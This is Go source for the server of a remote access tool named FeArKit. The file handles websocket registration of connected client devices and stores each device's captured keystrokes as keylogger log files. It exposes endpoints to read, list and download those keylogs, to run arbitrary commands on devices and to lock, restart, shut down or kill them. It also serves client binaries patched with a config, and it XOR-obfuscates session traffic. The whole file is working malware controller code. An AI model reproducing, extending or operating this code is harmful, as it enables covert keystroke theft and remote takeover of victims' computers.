package utility

import (
	"FeArKit/modules"
	"FeArKit/server/common"
	"FeArKit/server/config"
	"FeArKit/utils"
	"FeArKit/utils/melody"
	"bytes"
	"context"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

type Sender func(pack modules.Packet, session *melody.Session) bool

// CheckForm checks if the form contains the required fields.
// Every request must contain connection UUID or device ID.
func CheckForm(ctx *gin.Context, form any) (string, bool) {
	var base struct {
		Conn   string `json:"uuid" yaml:"uuid" form:"uuid"`
		Device string `json:"device" yaml:"device" form:"device"`
	}
	if form != nil && ctx.ShouldBind(form) != nil {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return ``, false
	}
	if ctx.ShouldBind(&base) != nil || (len(base.Conn) == 0 && len(base.Device) == 0) {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return ``, false
	}
	connUUID, ok := common.CheckDevice(base.Device, base.Conn)
	if !ok {
		ctx.AbortWithStatusJSON(http.StatusBadGateway, modules.Packet{Code: 1, Msg: `${i18n|COMMON.DEVICE_NOT_EXIST}`})
		return ``, false
	}
	ctx.Request = ctx.Request.WithContext(context.WithValue(ctx.Request.Context(), `ConnUUID`, connUUID))
	return connUUID, true
}

// OnDevicePack handles events about device info.
// Such as websocket handshake and update device info.
func OnDevicePack(data []byte, session *melody.Session) error {
	var pack struct {
		Code   int            `json:"code,omitempty"`
		Act    string         `json:"act,omitempty"`
		Msg    string         `json:"msg,omitempty"`
		Device modules.Device `json:"data"`
	}
	err := utils.JSON.Unmarshal(data, &pack)
	if err != nil {
		session.Close()
		return err
	}

	addr, ok := session.Get(`Address`)
	if ok {
		pack.Device.WAN = addr.(string)
	} else {
		pack.Device.WAN = `Unknown`
	}
	var DeviceData *modules.Device

	if pack.Act == `DEVICE_UP` {
		// Cancel any grace-period timer from a recent disconnect for this device.
		// This suppresses the deferred CLIENT_OFFLINE event when the client
		// reconnects faster than the TTL.
		if pack.Device.ID != `` {
			if cancel, ok := common.PendingDisconnects.Pop(pack.Device.ID); ok {
				cancel()
			}
		}

		// Register the new session. Do this before evicting stale sessions so
		// the device is always present in the map — no gap, no UI flicker.
		common.Devices.Set(session.UUID, &pack.Device)

		// Evict any other sessions that share the same device ID (e.g. a
		// lingering session from before a quick reconnect).
		if pack.Device.ID != `` {
			var staleUUIDs []string
			common.Devices.IterCb(func(existingUUID string, d *modules.Device) bool {
				if d.ID == pack.Device.ID && existingUUID != session.UUID {
					staleUUIDs = append(staleUUIDs, existingUUID)
				}
				return true
			})
			for _, staleUUID := range staleUUIDs {
				// Remove the stale map entry first, then mark the session as
				// superseded so wsOnDisconnect skips its grace-period logic.
				common.Devices.Remove(staleUUID)
				if s, ok := common.Melody.GetSessionByUUID(staleUUID); ok {
					s.Set(`superseded`, true)
					s.Close()
				}
			}
		}
		DeviceData = &pack.Device
		common.Info(nil, `CLIENT_ONLINE`, ``, ``, map[string]any{
			`device`: map[string]any{
				`name`: pack.Device.Hostname,
				`ip`:   pack.Device.WAN,
				`id`:   pack.Device.ID,
			},
		})
	} else {
		device, ok := common.Devices.Get(session.UUID)
		if ok {
			device.CPU = pack.Device.CPU
			device.RAM = pack.Device.RAM
			device.Net = pack.Device.Net
			device.Disk = pack.Device.Disk
			device.Uptime = pack.Device.Uptime
		}
		DeviceData = device
	}
	if len(pack.Device.KeyloggerData) > 0 {
		keyloggerData := strings.Join(pack.Device.KeyloggerData, "")
		// filename includes session UUID so multiple agents on the same machine
		// each get their own file, and no ambiguity arises on reconnect.
		filename := fmt.Sprintf("keylogger_%s_%s_%s.log", DeviceData.ID, session.UUID, DeviceData.Hostname)

		f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			common.Warn(nil, "KEYLOGGER", "fail", "unable to open file", map[string]any{"error": err.Error()})
		} else {
			defer f.Close()
			if _, err := f.WriteString(keyloggerData + "\n"); err != nil {
				common.Warn(nil, "KEYLOGGER", "fail", "unable to write file", map[string]any{"error": err.Error()})
			}
			if err := f.Sync(); err != nil {
				common.Warn(nil, "KEYLOGGER", "fail", "unable to sync file", map[string]any{"error": err.Error()})
			}
		}
	}
	common.SendPack(modules.Packet{Code: 0}, session)
	return nil
}

// CheckUpdate will check if client need update and return latest client if so.
func CheckUpdate(ctx *gin.Context) {
	var form struct {
		OS     string `form:"os" binding:"required"`
		Arch   string `form:"arch" binding:"required"`
		Commit string `form:"commit" binding:"required"`
	}
	if err := ctx.ShouldBind(&form); err != nil {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return
	}
	if form.Commit == config.Commit {
		ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
		common.Warn(ctx, `CLIENT_UPDATE`, `success`, `latest`, map[string]any{
			`client`: map[string]any{
				`os`:     form.OS,
				`arch`:   form.Arch,
				`commit`: form.Commit,
			},
			`server`: config.Commit,
		})
		return
	}
	builtPath := config.BuiltClientPath(form.OS, form.Arch)
	tpl, err := os.Open(builtPath)
	if err != nil {
		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: `${i18n|GENERATOR.NO_PREBUILT_FOUND}`})
		common.Warn(ctx, `CLIENT_UPDATE`, `fail`, `no prebuild asset`, map[string]any{
			`path`: builtPath,
			`client`: map[string]any{
				`os`:     form.OS,
				`arch`:   form.Arch,
				`commit`: form.Commit,
			},
			`server`: config.Commit,
		})
		return
	}
	defer tpl.Close()

	const MaxBodySize = 384 // This is size of client config buffer.
	if ctx.Request.ContentLength > MaxBodySize {
		ctx.AbortWithStatusJSON(http.StatusRequestEntityTooLarge, modules.Packet{Code: 1})
		common.Warn(ctx, `CLIENT_UPDATE`, `fail`, `config too large`, map[string]any{
			`client`: map[string]any{
				`os`:     form.OS,
				`arch`:   form.Arch,
				`commit`: form.Commit,
			},
			`server`: config.Commit,
		})
		return
	}
	body, err := ctx.GetRawData()
	if err != nil {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: 1})
		common.Warn(ctx, `CLIENT_UPDATE`, `fail`, `read config fail`, map[string]any{
			`client`: map[string]any{
				`os`:     form.OS,
				`arch`:   form.Arch,
				`commit`: form.Commit,
			},
			`server`: config.Commit,
		})
		return
	}
	session := common.CheckClientReq(ctx)
	if session == nil {
		ctx.AbortWithStatusJSON(http.StatusUnauthorized, modules.Packet{Code: 1})
		common.Warn(ctx, `CLIENT_UPDATE`, `fail`, `check config fail`, map[string]any{
			`client`: map[string]any{
				`os`:     form.OS,
				`arch`:   form.Arch,
				`commit`: form.Commit,
			},
			`server`: config.Commit,
		})
		return
	}

	common.Info(ctx, `CLIENT_UPDATE`, `success`, `updating`, map[string]any{
		`client`: map[string]any{
			`os`:     form.OS,
			`arch`:   form.Arch,
			`commit`: form.Commit,
		},
		`server`: config.Commit,
	})

	ctx.Header(`Accept-Ranges`, `none`)
	ctx.Header(`Content-Transfer-Encoding`, `binary`)
	ctx.Header(`Content-Type`, `application/octet-stream`)
	if stat, err := tpl.Stat(); err == nil {
		ctx.Header(`Content-Length`, strconv.FormatInt(stat.Size(), 10))
	}
	cfgBuffer := bytes.Repeat([]byte{'\x19'}, 384)
	prevBuffer := make([]byte, 0)
	for {
		thisBuffer := make([]byte, 1024)
		n, err := tpl.Read(thisBuffer)
		thisBuffer = thisBuffer[:n]
		tempBuffer := append(prevBuffer, thisBuffer...)
		bufIndex := bytes.Index(tempBuffer, cfgBuffer)
		if bufIndex > -1 {
			tempBuffer = bytes.Replace(tempBuffer, cfgBuffer, body, -1)
		}
		ctx.Writer.Write(tempBuffer[:len(prevBuffer)])
		prevBuffer = tempBuffer[len(prevBuffer):]
		if err != nil {
			break
		}
	}
	if len(prevBuffer) > 0 {
		ctx.Writer.Write(prevBuffer)
		prevBuffer = []byte{}
	}
}

// ExecDeviceCmd execute command on device.
func ExecDeviceCmd(ctx *gin.Context) {
	var form struct {
		Cmd  string `json:"cmd" yaml:"cmd" form:"cmd" binding:"required"`
		Args string `json:"args" yaml:"args" form:"args"`
	}
	target, ok := CheckForm(ctx, &form)
	if !ok {
		return
	}
	if len(form.Cmd) == 0 {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return
	}
	trigger := utils.GetStrUUID()
	common.SendPackByUUID(modules.Packet{Act: `COMMAND_EXEC`, Data: gin.H{`cmd`: form.Cmd, `args`: form.Args}, Event: trigger}, target)
	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
		if p.Code != 0 {
			common.Warn(ctx, `EXEC_COMMAND`, `fail`, p.Msg, map[string]any{
				`cmd`:  form.Cmd,
				`args`: form.Args,
			})
			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
		} else {
			common.Info(ctx, `EXEC_COMMAND`, `success`, ``, map[string]any{
				`cmd`:  form.Cmd,
				`args`: form.Args,
			})
			ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
		}
	}, target, trigger, 5*time.Second)
	if !ok {
		common.Warn(ctx, `EXEC_COMMAND`, `fail`, `timeout`, map[string]any{
			`cmd`:  form.Cmd,
			`args`: form.Args,
		})
		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
	}
}

// GetUIConfig returns UI-relevant server configuration flags.
func GetUIConfig(ctx *gin.Context) {
	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: gin.H{
		"noGenerate": config.Config.NoGenerate,
	}})
}

// GetDeviceMetadata requests full metadata from a connected client and returns it.
func GetDeviceMetadata(ctx *gin.Context) {
	target, ok := CheckForm(ctx, nil)
	if !ok {
		return
	}
	// Pass the WAN IP we have on record so the client can include it without
	// making an outbound HTTP request.
	wan := ``
	if device, ok := common.Devices.Get(target); ok {
		wan = device.WAN
	}
	trigger := utils.GetStrUUID()
	common.SendPackByUUID(modules.Packet{
		Act:   `CLIENT_INFO`,
		Event: trigger,
		Data:  gin.H{`wan`: wan},
	}, target)
	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
		if p.Code != 0 {
			common.Warn(ctx, `CLIENT_INFO`, `fail`, p.Msg, nil)
			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
		} else {
			common.Info(ctx, `CLIENT_INFO`, `success`, ``, nil)
			ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: p.Data})
		}
	}, target, trigger, 10*time.Second)
	if !ok {
		common.Warn(ctx, `CLIENT_INFO`, `fail`, `timeout`, nil)
		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
	}
}

// GetDevices will return all info about all clients.
func GetDevices(ctx *gin.Context) {
	devices := map[string]any{}
	common.Devices.IterCb(func(uuid string, device *modules.Device) bool {
		devices[uuid] = *device
		return true
	})
	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: devices})
}

// CallDevice will call client with command from browser.
func CallDevice(ctx *gin.Context) {
	act := strings.ToUpper(ctx.Param(`act`))
	if len(act) == 0 {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return
	}
	{
		actions := []string{`LOCK`, `LOGOFF`, `HIBERNATE`, `SUSPEND`, `RESTART`, `SHUTDOWN`, `KILL`}
		ok := false
		for _, v := range actions {
			if v == act {
				ok = true
				break
			}
		}
		if !ok {
			common.Warn(ctx, `CALL_DEVICE`, `fail`, `invalid act`, map[string]any{
				`act`: act,
			})
			ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
			return
		}
	}
	connUUID, ok := CheckForm(ctx, nil)
	if !ok {
		return
	}
	trigger := utils.GetStrUUID()
	common.SendPackByUUID(modules.Packet{Act: act, Event: trigger}, connUUID)
	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
		if p.Code != 0 {
			common.Warn(ctx, `CALL_DEVICE`, `fail`, p.Msg, map[string]any{
				`act`: act,
			})
			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
		} else {
			common.Info(ctx, `CALL_DEVICE`, `success`, ``, map[string]any{
				`act`: act,
			})
			ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
		}
	}, connUUID, trigger, 5*time.Second)
	if !ok {
		//This means the client is offline.
		//So we take this as a success.
		common.Info(ctx, `CALL_DEVICE`, `success`, ``, map[string]any{
			`act`: act,
		})
		ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
	}
}

func SimpleEncrypt(data []byte, session *melody.Session) []byte {
	temp, ok := session.Get(`Secret`)
	if !ok {
		return nil
	}
	secret := temp.([]byte)
	return utils.XOR(data, secret)
}

func SimpleDecrypt(data []byte, session *melody.Session) []byte {
	temp, ok := session.Get(`Secret`)
	if !ok {
		return nil
	}
	secret := temp.([]byte)
	return utils.XOR(data, secret)
}

func WSHealthCheck(container *melody.Melody, sender Sender) {
	const MaxIdleSeconds = 300
	ping := func(uuid string, s *melody.Session) {
		if !sender(modules.Packet{Act: `PING`}, s) {
			s.Close()
		}
	}
	for now := range time.NewTicker(60 * time.Second).C {
		timestamp := now.Unix()
		// stores sessions to be disconnected
		queue := make([]*melody.Session, 0)
		container.IterSessions(func(uuid string, s *melody.Session) bool {
			go ping(uuid, s)
			val, ok := s.Get(`LastPack`)
			if !ok {
				queue = append(queue, s)
				return true
			}
			lastPack, ok := val.(int64)
			if !ok {
				queue = append(queue, s)
				return true
			}
			if timestamp-lastPack > MaxIdleSeconds {
				queue = append(queue, s)
			}
			return true
		})
		for i := 0; i < len(queue); i++ {
			queue[i].Close()
		}
	}
}

// keylogPattern returns the glob pattern that matches all keylog files for a device.
// Files are named: keylogger_<deviceID>_<sessionUUID>_<hostname>.log
func keylogPattern(deviceID string) string {
	return fmt.Sprintf("keylogger_%s_*.log", deviceID)
}

// keylogFileForSession returns the exact filename for the given session UUID.
func keylogFileForSession(deviceID, sessionUUID, hostname string) string {
	return fmt.Sprintf("keylogger_%s_%s_%s.log", deviceID, sessionUUID, hostname)
}

// GetKeylog reads the keylog file for the connected session and returns its content.
func GetKeylog(ctx *gin.Context) {
	target, ok := CheckForm(ctx, nil)
	if !ok {
		return
	}
	device, ok := common.Devices.Get(target)
	if !ok {
		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: "Device not found"})
		return
	}
	filename := keylogFileForSession(device.ID, target, device.Hostname)
	data, err := os.ReadFile(filename)
	if err != nil {
		// Return empty rather than 404 when file doesn't exist yet.
		if os.IsNotExist(err) {
			ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"log": ""}})
			return
		}
		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
		return
	}
	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"log": string(data)}})
}

// ListKeylogFiles returns metadata for all keylog files that belong to any
// session of the given device (matched by device ID prefix).
func ListKeylogFiles(ctx *gin.Context) {
	target, ok := CheckForm(ctx, nil)
	if !ok {
		return
	}
	device, ok := common.Devices.Get(target)
	if !ok {
		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: "Device not found"})
		return
	}
	matches, err := filepath.Glob(keylogPattern(device.ID))
	if err != nil {
		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
		return
	}
	type fileInfo struct {
		Name      string `json:"name"`
		Size      int64  `json:"size"`
		SessionID string `json:"session_id"`
		Current   bool   `json:"current"`
	}
	files := make([]fileInfo, 0, len(matches))
	for _, path := range matches {
		fi, err := os.Stat(path)
		if err != nil {
			continue
		}
		// Extract session UUID from filename: keylogger_<id>_<uuid>_<host>.log
		base := filepath.Base(path)
		// strip "keylogger_<id>_" prefix and ".log" suffix, then first segment is UUID
		prefix := fmt.Sprintf("keylogger_%s_", device.ID)
		sessionUUID := ""
		if len(base) > len(prefix) {
			rest := base[len(prefix) : len(base)-4] // strip prefix and ".log"
			// UUID is 36 chars; it comes before the next underscore-hostname
			if len(rest) >= 36 {
				sessionUUID = rest[:36]
			}
		}
		files = append(files, fileInfo{
			Name:      base,
			Size:      fi.Size(),
			SessionID: sessionUUID,
			Current:   sessionUUID == target,
		})
	}
	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"files": files}})
}

// DownloadKeylogFile serves a raw keylog file for download.
// The filename is passed as a query param and validated to prevent path traversal.
func DownloadKeylogFile(ctx *gin.Context) {
	filename := ctx.Query("file")
	if filename == "" {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: "missing file param"})
		return
	}
	// Safety: only allow plain filenames with no directory separators.
	if filepath.Base(filename) != filename || strings.Contains(filename, "..") {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: "invalid filename"})
		return
	}
	// Must match the keylogger_ prefix pattern.
	if !strings.HasPrefix(filename, "keylogger_") || !strings.HasSuffix(filename, ".log") {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: "invalid filename"})
		return
	}
	ctx.FileAttachment(filename, filename)
}